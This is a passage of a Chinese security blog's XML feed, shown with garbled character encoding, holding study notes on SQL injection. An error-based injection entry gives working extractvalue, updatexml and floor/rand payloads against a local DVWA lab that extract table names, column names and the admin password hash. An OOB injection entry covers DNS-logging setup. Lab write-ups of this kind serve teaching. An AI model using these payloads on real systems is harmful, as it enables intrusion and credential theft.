id="2ã€æ‰“åŒ…æ–‡ä»¶"><a href="#2ã€æ‰“åŒ…æ–‡ä»¶" class="headerlink" title="2ã€æ‰“åŒ…æ–‡ä»¶"></a>2ã€æ‰“åŒ…æ–‡ä»¶</h4><pre><code class="hljs python"><span class="hljs-comment"># æ‰“åŒ…ä¸ºeggæ–‡ä»¶</span>python setup.py bdist_egg<span class="hljs-comment"># æ‰“åŒ…ä¸ºwhlæ–‡ä»¶</span>python setup.py bdist_wheel</code></pre><h5 id="è¿è¡Œåä¼šåœ¨å½“å‰ç›®å½•å¤šå‡º3ä¸ªæ–‡ä»¶å¤¹ï¼šbuildã€distã€driver-egg-info"><a href="#è¿è¡Œåä¼šåœ¨å½“å‰ç›®å½•å¤šå‡º3ä¸ªæ–‡ä»¶å¤¹ï¼šbuildã€distã€driver-egg-info" class="headerlink" title="è¿è¡Œåä¼šåœ¨å½“å‰ç›®å½•å¤šå‡º3ä¸ªæ–‡ä»¶å¤¹ï¼šbuildã€distã€driver.egg-info"></a>è¿è¡Œåä¼šåœ¨å½“å‰ç›®å½•å¤šå‡º3ä¸ªæ–‡ä»¶å¤¹ï¼šbuildã€distã€driver.egg-info</h5><h5 id="æ‰“åŒ…å¥½åçš„whlæ–‡ä»¶åœ¨distæ–‡ä»¶å¤¹å†…ï¼Œè¿›å…¥distæ–‡ä»¶å¤¹ä¸­å®‰è£…whlæ–‡ä»¶ï¼š"><a href="#æ‰“åŒ…å¥½åçš„whlæ–‡ä»¶åœ¨distæ–‡ä»¶å¤¹å†…ï¼Œè¿›å…¥distæ–‡ä»¶å¤¹ä¸­å®‰è£…whlæ–‡ä»¶ï¼š" class="headerlink" title="æ‰“åŒ…å¥½åçš„whlæ–‡ä»¶åœ¨distæ–‡ä»¶å¤¹å†…ï¼Œè¿›å…¥distæ–‡ä»¶å¤¹ä¸­å®‰è£…whlæ–‡ä»¶ï¼š"></a>æ‰“åŒ…å¥½åçš„whlæ–‡ä»¶åœ¨distæ–‡ä»¶å¤¹å†…ï¼Œè¿›å…¥distæ–‡ä»¶å¤¹ä¸­å®‰è£…whlæ–‡ä»¶ï¼š</h5><pre><code class="hljs python">pip install driver<span class="hljs-number">-0.1</span>-py3-none-any.whl</code></pre>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€ŠWebæ”»é˜²å®‰å…¨å®æˆ˜ã€‹å­¦ä¹ æ€»ç»“ï¼šSQLæ³¨å…¥å®æˆ˜â€”-OOBæ³¨å…¥</title>
    <link href="/2021/03/27/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E2%80%94-OOB%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/03/27/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E2%80%94-OOB%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="OOBæ³¨å…¥æ¶‰åŠåŸç†"><a href="#OOBæ³¨å…¥æ¶‰åŠåŸç†" class="headerlink" title="OOBæ³¨å…¥æ¶‰åŠåŸç†"></a>OOBæ³¨å…¥æ¶‰åŠåŸç†</h1><h2 id="OOBæ³¨å…¥ï¼ˆOut-of-Bandï¼š"><a href="#OOBæ³¨å…¥ï¼ˆOut-of-Bandï¼š" class="headerlink" title="OOBæ³¨å…¥ï¼ˆOut of Bandï¼š"></a>OOBæ³¨å…¥ï¼ˆOut of Bandï¼š</h2><p>å¸¦å¤–é€šé“æŠ€æœ¯ï¼ˆOOBï¼‰è®©æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡å¦ä¸€ç§æ–¹å¼æ¥ç¡®è®¤å’Œåˆ©ç”¨æ²¡æœ‰ç›´æ¥å›æ˜¾çš„æ¼æ´ã€‚è¿™ç±»æ¼æ´ä¸­ï¼Œæ”»å‡»è€…æ— æ³•é€šè¿‡æ¶æ„è¯·æ±‚ç›´æ¥åœ¨å“åº”åŒ…ä¸­çœ‹åˆ°æ¼æ´çš„è¾“å‡ºç»“æœã€‚<br>å¸¦å¤–é€šé“æŠ€æœ¯é€šå¸¸éœ€è¦è„†å¼±çš„å®ä½“æ¥ç”Ÿæˆå¸¦å¤–çš„TCP/UDP/ICMPè¯·æ±‚ï¼Œç„¶åæ”»å‡»è€…å¯ä»¥é€šè¿‡è¿™ä¸ªè¯·æ±‚æå–æ•°æ®ã€‚</p><h2 id="æ³›åŸŸåè§£æ"><a href="#æ³›åŸŸåè§£æ" class="headerlink" title="æ³›åŸŸåè§£æ"></a>æ³›åŸŸåè§£æ</h2><p>æ³›åŸŸåè§£æå°±æ˜¯åˆ©ç”¨é€šé…ç¬¦çš„æ–¹å¼å°†æ‰€æœ‰çš„æ¬¡çº§åŸŸåæŒ‡å‘åŒä¸€IPã€‚å¦‚<a href="http://www.example.comå’Œabc.example.coméƒ½ä¼šè®¿é—®åˆ°åŒä¸€ä¸ªç«™ç‚¹ã€‚" target="_blank" rel="noopener">www.example.comå’Œabc.example.coméƒ½ä¼šè®¿é—®åˆ°åŒä¸€ä¸ªç«™ç‚¹ã€‚</a></p><h2 id="UNCè·¯å¾„ï¼š"><a href="#UNCè·¯å¾„ï¼š" class="headerlink" title="UNCè·¯å¾„ï¼š"></a>UNCè·¯å¾„ï¼š</h2><p>Universal Naming Convention/é€šç”¨å‘½åè§„åˆ™ã€‚<br>Windowsä¸»æœºé»˜è®¤å­˜åœ¨ï¼ŒLinuxä¸»æœºé»˜è®¤ä¸å­˜åœ¨ã€‚æ ¼å¼ï¼š\servername\sharenameï¼Œå…¶ä¸­servernameæ˜¯æœåŠ¡å™¨åï¼Œsharenameæ˜¯å…±äº«èµ„æºçš„åç§°ã€‚<br>æˆ‘ä»¬å¹³æ—¶ä½¿ç”¨æ‰“å°æœºã€ç½‘ç»œå…±äº«æ–‡ä»¶å¤¹æ—¶ï¼Œéƒ½ä¼šç”¨åˆ°UNCå¡«å†™åœ°å€ï¼Œå¹¶ä¸”åœ¨å½“æˆ‘ä»¬åœ¨ä½¿ç”¨UNCè·¯å¾„æ—¶ï¼Œä¼šå¯¹åŸŸåè¿›è¡ŒDNSæŸ¥è¯¢ã€‚</p><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><h2 id="CEYEå¹³å°"><a href="#CEYEå¹³å°" class="headerlink" title="CEYEå¹³å°"></a>CEYEå¹³å°</h2><p>CEYEå¹³å°å¯ä»¥ç›‘æ§DNSè¯·æ±‚ï¼Œå¹¶ä¸”é…ç½®äº†æ³›åŸŸåè§£æã€‚<br><img src="/img/sql/oob/ceye1.png" srcset="/img/loading.gif" alt="fileupload"><br>å¯¹æ³¨å†Œååˆ†é…åˆ°åŸŸåå’Œå…¶æ³›åŸŸåè¿›è¡Œè§£ææµ‹è¯•ï¼Œå¯åœ¨å¹³å°ä¸ŠæˆåŠŸæŸ¥è¯¢åˆ°è§£æè®°å½•ï¼š<br><img src="/img/sql/oob/ceye2.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/sql/oob/ceye3.png" srcset="/img/loading.gif" alt="fileupload"></p><h2 id="phpstudy"><a href="#phpstudy" class="headerlink" title="phpstudy"></a>phpstudy</h2><p>å®‰è£…phpstudyï¼Œå¯åŠ¨Apacheã€MysqlæœåŠ¡å™¨;åŒæ—¶å®‰è£…è¾ƒä½ç‰ˆæœ¬çš„phpï¼Œå¦‚5.2.17ï¼š<br><img src="/img/sql/oob/phpstudy1.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/sql/oob/phpstudy2.png" srcset="/img/loading.gif" alt="fileupload"></p><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><p>ä¿®æ”¹MySQLæœåŠ¡å™¨æƒé™ï¼Œè¿è¡Œrootç”¨æˆ·è¿œç¨‹ç™»å½•ï¼š<br><img src="/img/sql/oob/phpstudy3.png" srcset="/img/loading.gif" alt="fileupload"></p>]]></content>
    
    
    <categories>
      
      <category>Webå®‰å…¨</category>
      
      <category>SQLæ³¨å…¥</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å®‰å…¨</tag>
      
      <tag>Webå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€ŠWebæ”»é˜²å®‰å…¨å®æˆ˜ã€‹å­¦ä¹ æ€»ç»“ï¼šSQLæ³¨å…¥å®æˆ˜â€”â€”æ•°æ®åº“æŠ¥é”™æ³¨å…¥</title>
    <link href="/2021/01/17/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/01/17/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h1><h2 id="MySQLæŠ¥é”™æ³¨å…¥ä¸»è¦åˆ†ç±»"><a href="#MySQLæŠ¥é”™æ³¨å…¥ä¸»è¦åˆ†ç±»" class="headerlink" title="MySQLæŠ¥é”™æ³¨å…¥ä¸»è¦åˆ†ç±»"></a>MySQLæŠ¥é”™æ³¨å…¥ä¸»è¦åˆ†ç±»</h2><p>1ã€BigIntç­‰æ•°æ®ç±»å‹æº¢å‡º<br>2ã€Xpathè¯­æ³•é”™è¯¯<br>3ã€count() + rand() + group_by()å¯¼è‡´é‡å¤<br>4ã€ç©ºé—´æ•°æ®ç±»å‹å‡½æ•°é”™è¯¯</p><h2 id="æŠ¥é”™æ³¨å…¥å¸¸ç”¨å‡½æ•°"><a href="#æŠ¥é”™æ³¨å…¥å¸¸ç”¨å‡½æ•°" class="headerlink" title="æŠ¥é”™æ³¨å…¥å¸¸ç”¨å‡½æ•°"></a>æŠ¥é”™æ³¨å…¥å¸¸ç”¨å‡½æ•°</h2><h3 id="1ã€floorå‡½æ•°"><a href="#1ã€floorå‡½æ•°" class="headerlink" title="1ã€floorå‡½æ•°"></a>1ã€floorå‡½æ•°</h3><h4 id="ç›¸å…³å‡½æ•°ï¼š"><a href="#ç›¸å…³å‡½æ•°ï¼š" class="headerlink" title="ç›¸å…³å‡½æ•°ï¼š"></a>ç›¸å…³å‡½æ•°ï¼š</h4><pre><code class="hljs plain">floor(): å»é™¤å°æ•°éƒ¨åˆ†count(x): è¿”å›xæ•°æ®é›†çš„æ•°é‡rand(): äº§ç”Ÿéšæœºæ•°rand(x): æ¯ä¸ªxå¯¹åº”ä¸€ä¸ªå›ºå®šçš„å€¼ï¼Œä½†æ˜¯å¦‚æœè¿ç»­æ‰§è¡Œå¤šæ¬¡å€¼ä¼šå˜åŒ–ï¼Œä¸è¿‡ä¹Ÿæ˜¯å¯é¢„æµ‹çš„floor(rand(0)*2):å¯¹åº”çš„æœ‰è§„å¾‹æ•°åˆ—ä¸º 011011...</code></pre><h4 id="æ³¨å…¥SQLï¼š"><a href="#æ³¨å…¥SQLï¼š" class="headerlink" title="æ³¨å…¥SQLï¼š"></a>æ³¨å…¥SQLï¼š</h4><pre><code class="hljs plain">select count(*) ,concat(database(),floor(rand(0)*2))x from test group by x ï¼šxè¡¨ç¤ºå‰é¢æ‹¬å·å†…çš„åˆ«å</code></pre><h4 id="æŠ¥é”™ä¿¡æ¯ï¼š"><a href="#æŠ¥é”™ä¿¡æ¯ï¼š" class="headerlink" title="æŠ¥é”™ä¿¡æ¯ï¼š"></a>æŠ¥é”™ä¿¡æ¯ï¼š</h4><pre><code class="hljs plain">Can&#39;t writeï¼›duplicate key in table â€˜&#x2F;tmp&#x2F;#sql935_27_2fâ€™</code></pre><h4 id="åŸç†å‰–æï¼š"><a href="#åŸç†å‰–æï¼š" class="headerlink" title="åŸç†å‰–æï¼š"></a>åŸç†å‰–æï¼š</h4><p>è¯¥æ³¨å…¥çš„å…³é”®å‡½æ•°æ˜¯group by xï¼Œå³group by (floor(rand(0)<em>2))ï¼›é¦–å…ˆæ˜ç™½ä¸¤ä¸ªæ¦‚å¿µï¼šgroup byæŸ¥è¯¢ä¼šæ–°å»ºä¸€å¼ è™šæ‹Ÿè¡¨ï¼Œä¿å­˜æŸ¥è¯¢çš„ç»“æœï¼Œè€Œrandå‡½æ•°æ¯è¢«è°ƒç”¨ä¸€æ¬¡å°±ä¼šè¿›è¡Œä¸€æ¬¡è®¡ç®—ã€‚<br>å¦‚ä¸‹å›¾ï¼Œsqlè¯­å¥ç¬¬ä¸€æ¬¡æ‰§è¡Œæ—¶ï¼Œfloor(rand(0)</em>2)=0ï¼ŒæŸ¥è¯¢è™šæ‹Ÿè¡¨ä¸»é”®0ï¼Œä¸å­˜åœ¨ï¼Œåˆ¤æ–­ç›´æ¥æ’å…¥ï¼Œåœ¨æ’å…¥æ—¶ä¼šåœ¨group by xå†æ¬¡è®¡ç®—floor(rand(0)<em>2)=1ï¼Œå› æ­¤å®é™…æ’å…¥çš„ä¸»é”®å€¼=1ï¼›ç¬¬äºŒæ¬¡æŸ¥è¯¢æ—¶floor(rand(0)</em>2)=1ï¼Œä¸»é”®å­˜åœ¨ï¼Œä¸»é”®ç›´æ¥+1æ’å…¥å³å¯ï¼›å†æ¬¡è¿›è¡Œfloor(rand(0)<em>2)è®¡ç®—ï¼Œæ­¤æ—¶æ˜¯floor(rand(0)</em>2)çš„ç¬¬å››æ¬¡è¿ç®—ï¼Œå€¼ä¸º0ï¼Œéœ€è¦æ’å…¥ä¸»é”®ä¸º0çš„æ•°æ®ï¼Œå’Œç¬¬ä¸€æ¬¡æ’å…¥ä¸€æ ·ï¼Œæ‰§è¡Œè¿‡ç¨‹ä¼šè¿è¡Œgroup by xï¼Œå®é™…æ’å…¥çš„ä¸»é”®å€¼å˜æˆ1ï¼Œå¯¼è‡´ä¸»é”®é‡å¤ï¼Œæ•°æ®åº“æŠ¥é”™ã€‚<br><img src="/img/sql/errorbase/error1.png" srcset="/img/loading.gif" alt="fileupload"></p><h3 id="2ã€extractvalueå‡½æ•°ï¼ˆæœ€å¤š32å­—ç¬¦ï¼‰"><a href="#2ã€extractvalueå‡½æ•°ï¼ˆæœ€å¤š32å­—ç¬¦ï¼‰" class="headerlink" title="2ã€extractvalueå‡½æ•°ï¼ˆæœ€å¤š32å­—ç¬¦ï¼‰"></a>2ã€extractvalueå‡½æ•°ï¼ˆæœ€å¤š32å­—ç¬¦ï¼‰</h3><p>extractvalue() :å¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢çš„å‡½æ•°</p><p>å…¶å®å°±æ˜¯ç›¸å½“äºæˆ‘ä»¬ç†Ÿæ‚‰çš„HTMLæ–‡ä»¶ä¸­ç”¨ <div><p><a>æ ‡ç­¾æŸ¥æ‰¾å…ƒç´ ä¸€æ ·<br>è¯­æ³•ï¼šextractvalue(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„)</p><p>ç¬¬äºŒä¸ªå‚æ•° xmlä¸­çš„ä½ç½®æ˜¯å¯æ“ä½œçš„åœ°æ–¹ï¼Œxmlæ–‡æ¡£ä¸­æŸ¥æ‰¾å­—ç¬¦ä½ç½®æ˜¯ç”¨ /xxx/xxx/xxx/â€¦è¿™ç§æ ¼å¼ï¼Œ<br>å¦‚æœæˆ‘ä»¬å†™å…¥å…¶ä»–æ ¼å¼ï¼Œå°±ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”ä¼šè¿”å›æˆ‘ä»¬å†™å…¥çš„éæ³•æ ¼å¼å†…å®¹ï¼Œè€Œè¿™ä¸ªéæ³•çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬æƒ³è¦æŸ¥è¯¢çš„å†…å®¹ã€‚<br>æ­£å¸¸æŸ¥è¯¢ ç¬¬äºŒä¸ªå‚æ•°çš„ä½ç½®æ ¼å¼ ä¸º /xxx/xx/xx/xx ,å³ä½¿æŸ¥è¯¢ä¸åˆ°ä¹Ÿä¸ä¼šæŠ¥é”™</p><h4 id="æ³¨å…¥SQLï¼š-1"><a href="#æ³¨å…¥SQLï¼š-1" class="headerlink" title="æ³¨å…¥SQLï¼š"></a>æ³¨å…¥SQLï¼š</h4><pre><code class="hljs plain">?id&#x3D;1&#39; and extractvalue(1, concat(0x7e (select @@version))) --&#39;</code></pre><h4 id="åŸç†å‰–æï¼š-1"><a href="#åŸç†å‰–æï¼š-1" class="headerlink" title="åŸç†å‰–æï¼š"></a>åŸç†å‰–æï¼š</h4><p>ä½¿ç”¨concatå‡½æ•°ï¼Œå°†é”™è¯¯ä¿¡æ¯è¿›è¡Œæ‹¼æ¥ï¼Œä½¿ç”¨0x7eæ³¢æµªå·ï¼Œextractvalueå‡½æ•°æ— æ³•å¤„ç†çš„å­—ç¬¦ï¼Œé˜²æ­¢select @@version è¢«æˆªæ–­<br><img src="/img/sql/errorbase/error2.png" srcset="/img/loading.gif" alt="fileupload"></p><h3 id="3ã€updatexmlå‡½æ•°"><a href="#3ã€updatexmlå‡½æ•°" class="headerlink" title="3ã€updatexmlå‡½æ•°"></a>3ã€updatexmlå‡½æ•°</h3><p>updatexml()å‡½æ•°ä¸extractvalue()ç±»ä¼¼ï¼Œæ˜¯æ›´æ–°xmlæ–‡æ¡£çš„å‡½æ•°ã€‚<br>è¯­æ³•updatexml(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„ï¼Œæ›´æ–°çš„å†…å®¹)</p><p>extractvalue()ã€updatexml()èƒ½æŸ¥è¯¢å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ä¸º32ï¼Œå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬æƒ³è¦çš„ç»“æœè¶…è¿‡32ï¼Œå°±éœ€è¦ç”¨substring()å‡½æ•°æˆªå–ï¼Œä¸€æ¬¡æŸ¥çœ‹32ä½</p><h4 id="æ³¨å…¥SQLï¼š-2"><a href="#æ³¨å…¥SQLï¼š-2" class="headerlink" title="æ³¨å…¥SQLï¼š"></a>æ³¨å…¥SQLï¼š</h4><pre><code class="hljs plain">?id&#x3D;2&#39; and updatexml(1, concat(0x7e (select @@version))) --&#39;</code></pre><h3 id="4ã€exp-å‡½æ•°"><a href="#4ã€exp-å‡½æ•°" class="headerlink" title="4ã€exp()å‡½æ•°"></a>4ã€exp()å‡½æ•°</h3><h4 id="ç›¸å…³å‡½æ•°"><a href="#ç›¸å…³å‡½æ•°" class="headerlink" title="ç›¸å…³å‡½æ•°"></a>ç›¸å…³å‡½æ•°</h4><p>ï½():å–åå‡½æ•°ï¼Œä¾‹å¦‚ä¸€ä¸ªæ­£æ•°å–åï¼Œä¼šå˜æˆä¸€ä¸ªè´Ÿæ•°ï¼Œè´Ÿæ•°ç”¨æ•°å­—å½¢å¼è¡¨ç¤ºæ˜¯ä¸€ä¸ªå¾ˆåºå¤§çš„æ•°å­—ï¼Œä¼ å…¥expä¼šå¯¼è‡´expå‡½æ•°æ— æ³•å¤„ç†ä»è€ŒæŠ¥é”™ï¼Œå¦‚ä¸‹å›¾ï¼š<br><img src="/img/sql/errorbase/error3.png" srcset="/img/loading.gif" alt="fileupload"><br>æ³¨æ„ï¼Œexp()äº§ç”Ÿé”™è¯¯ï¼Œåªä¼šè¿”å›æ‰§è¡Œè¯­å¥çš„è¡¨è¾¾å¼ï¼Œéœ€è¦è”åˆåç«¯è„šæœ¬è¯­è¨€è¿›è¡Œè§£æï¼Œä»è€Œè¿”å›ç›¸åº”çš„æ‰§è¡Œç»“æœ</p><h2 id="æŠ¥é”™æ³¨å…¥å®æˆ˜"><a href="#æŠ¥é”™æ³¨å…¥å®æˆ˜" class="headerlink" title="æŠ¥é”™æ³¨å…¥å®æˆ˜"></a>æŠ¥é”™æ³¨å…¥å®æˆ˜</h2><h3 id="ä½¿ç”¨extractvalue-å‡½æ•°è·å–ç”¨æˆ·å’Œæ•°æ®åº“å"><a href="#ä½¿ç”¨extractvalue-å‡½æ•°è·å–ç”¨æˆ·å’Œæ•°æ®åº“å" class="headerlink" title="ä½¿ç”¨extractvalue()å‡½æ•°è·å–ç”¨æˆ·å’Œæ•°æ®åº“å"></a>ä½¿ç”¨extractvalue()å‡½æ•°è·å–ç”¨æˆ·å’Œæ•°æ®åº“å</h3><pre><code class="hljs plain">http:&#x2F;&#x2F;127.0.0.1:8881&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;&#39; and extractvalue(1, concat(0x7e, user(), 0x7e,database())) -- &amp;Submit&#x3D;Submit#</code></pre><p><img src="/img/sql/errorbase/error4.png" srcset="/img/loading.gif" alt="fileupload"></p><h3 id="ä½¿ç”¨floorå‡½æ•°è·å–ç”¨æˆ·è¡¨å"><a href="#ä½¿ç”¨floorå‡½æ•°è·å–ç”¨æˆ·è¡¨å" class="headerlink" title="ä½¿ç”¨floorå‡½æ•°è·å–ç”¨æˆ·è¡¨å"></a>ä½¿ç”¨floorå‡½æ•°è·å–ç”¨æˆ·è¡¨å</h3><pre><code class="hljs plain">http:&#x2F;&#x2F;127.0.0.1:8881&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;&#39; union select 1,2 from (select count(*), concat((select table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39; limit 2, 1),&#39;|&#39;,floor(rand(0)*2))x from information_schema.tables group by x)a -- &amp;Submit&#x3D;Submit#</code></pre><p><img src="/img/sql/errorbase/error5.png" srcset="/img/loading.gif" alt="fileupload"></p><h3 id="ä½¿ç”¨extractvalue-å‡½æ•°è·å–ç”¨æˆ·è¡¨å­—æ®µ"><a href="#ä½¿ç”¨extractvalue-å‡½æ•°è·å–ç”¨æˆ·è¡¨å­—æ®µ" class="headerlink" title="ä½¿ç”¨extractvalue()å‡½æ•°è·å–ç”¨æˆ·è¡¨å­—æ®µ"></a>ä½¿ç”¨extractvalue()å‡½æ•°è·å–ç”¨æˆ·è¡¨å­—æ®µ</h3><pre><code class="hljs plain">http:&#x2F;&#x2F;127.0.0.1:8881&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;&#39; and extractvalue(1, concat(0x7e, (select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 3,1))) -- &amp;Submit&#x3D;Submit#</code></pre><p><img src="/img/sql/errorbase/error8.png" srcset="/img/loading.gif" alt="fileupload"></p><h3 id="ä½¿ç”¨floorå‡½æ•°è·å–ç”¨æˆ·åå¯†ç "><a href="#ä½¿ç”¨floorå‡½æ•°è·å–ç”¨æˆ·åå¯†ç " class="headerlink" title="ä½¿ç”¨floorå‡½æ•°è·å–ç”¨æˆ·åå¯†ç "></a>ä½¿ç”¨floorå‡½æ•°è·å–ç”¨æˆ·åå¯†ç </h3><pre><code class="hljs plain">http:&#x2F;&#x2F;127.0.0.1:8881&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;&#39; union select 1,2 from (select count(*), concat((select user from dvwa.users limit 0,1),&#39;|&#39;,    floor(rand(0)*2))x from information_schema.tables group by x)a -- &amp;Submit&#x3D;Submit#http:&#x2F;&#x2F;127.0.0.1:8881&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;&#39; union select 1,2 from (select count(*), concat((select password from dvwa.users limit 0,1),&#39;|&#39;,    floor(rand(0)*2))x from information_schema.tables group by x)a -- &amp;Submit&#x3D;Submit#</code></pre><p><img src="/img/sql/errorbase/error6.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/sql/errorbase/error7.png" srcset="/img/loading.gif" alt="fileupload"></p><p>âš ï¸æ³¨æ„ï¼šä½¿ç”¨extractvalueå‡½æ•°è·å–å¯†ç æ—¶ï¼Œæœ€å¤§é•¿åº¦ä¸º32ä½ï¼Œå¯†ç hashå¾ˆæœ‰å¯èƒ½è¢«æˆªæ–­ï¼Œå¯¼è‡´è·å–ä¸å…¨ï¼Œéœ€è¦ç»“åˆmidå‡½æ•°è·å–ã€‚</p><pre><code class="hljs plain"># ç¬¬ä¸€æ¬¡è·å–å‰29ä½http:&#x2F;&#x2F;127.0.0.1:8881&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;&#39; and extractvalue(1, mid(concat(0x7e,(select password from dvwa.users limit 0,1)),1,29)) -- &amp;Submit&#x3D;Submit## ç¬¬äºŒæ¬¡ä»ç¬¬29ä½è·å–29ä½http:&#x2F;&#x2F;127.0.0.1:8881&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;&#39; and extractvalue(1, mid(concat(0x7e,(select password from dvwa.users limit 0,1)),29,29)) -- &amp;Submit&#x3D;Submit#</code></pre><p><img src="/img/sql/errorbase/error9.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/sql/errorbase/error10.png" srcset="/img/loading.gif" alt="fileupload"><br>ä¸¤æ¬¡ç»“æœæ‹¼æ¥å’Œfloorå‡½æ•°å–å‡ºçš„adminå¯†ç ä¸€è‡´ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Webå®‰å…¨</category>
      
      <category>SQLæ³¨å…¥</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å®‰å…¨</tag>
      
      <tag>Webå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€ŠWebæ”»é˜²å®‰å…¨å®æˆ˜ã€‹å­¦ä¹ æ€»ç»“ï¼šSQLæ³¨å…¥å®æˆ˜â€”â€”HTTPå¤´ç›²æ³¨</title>
    <link href="/2021/01/09/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94HTTP%E5%A4%B4%E7%9B%B2%E6%B3%A8/"/>
    <url>/2021/01/09/%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94HTTP%E5%A4%B4%E7%9B%B2%E6%B3%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="HTTPå¤´ç›²æ³¨"><a href="#HTTPå¤´ç›²æ³¨" class="headerlink" title="HTTPå¤´ç›²æ³¨"></a>HTTPå¤´ç›²æ³¨</h1><h2 id="HTTPå¤´éƒ¨æ³¨å…¥"><a href="#HTTPå¤´éƒ¨æ³¨å…¥" class="headerlink" title="HTTPå¤´éƒ¨æ³¨å…¥"></a>HTTPå¤´éƒ¨æ³¨å…¥</h2><p>é’ˆå¯¹HTTPçš„è¯·æ±‚å¤´ï¼Œå¦‚æœä¸è¿›è¡Œè¿‡æ»¤å’Œè½¬ä¹‰ï¼Œç›´æ¥ä¸æ•°æ®åº“è¿›è¡Œäº¤äº’ï¼Œå°±å®¹æ˜“è¢«åˆ©ç”¨è¿›è¡ŒSQLæ³¨å…¥æ”»å‡»ï¼Œå³HTTPå¤´æ³¨å…¥ã€‚</p><h2 id="HTTPå¤´ç›²æ³¨å®æˆ˜"><a href="#HTTPå¤´ç›²æ³¨å®æˆ˜" class="headerlink" title="HTTPå¤´ç›²æ³¨å®æˆ˜"></a>HTTPå¤´ç›²æ³¨å®æˆ˜</h2><h3 id="åˆ¤æ–­æ³¨å…¥ç‚¹"><a href="#åˆ¤æ–­æ³¨å…¥ç‚¹" class="headerlink" title="åˆ¤æ–­æ³¨å…¥ç‚¹"></a>åˆ¤æ–­æ³¨å…¥ç‚¹</h3><p>é€‰æ‹©bwappç›¸åº”çš„æ¼æ´é¶åœºSQL Injection - Stored (User-Agent)ï¼Œé¡µé¢ä¼šè®°å½•ç™»å½•è®¾å¤‡çš„UAå’ŒIPã€‚<br><img src="/img/sql/httpheader/httpheader1.png" srcset="/img/loading.gif" alt="fileupload"><br>burpsuiteæŠ“åŒ…ä¿®æ”¹UAå€¼ï¼Œå‘ç°UAå¯æ§ï¼Œä¸”æ·»åŠ å•å¼•å·åˆ¤æ–­å­˜åœ¨æ³¨å…¥ç‚¹ï¼š<br><img src="/img/sql/httpheader/httpheader2.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/sql/httpheader/httpheader3.png" srcset="/img/loading.gif" 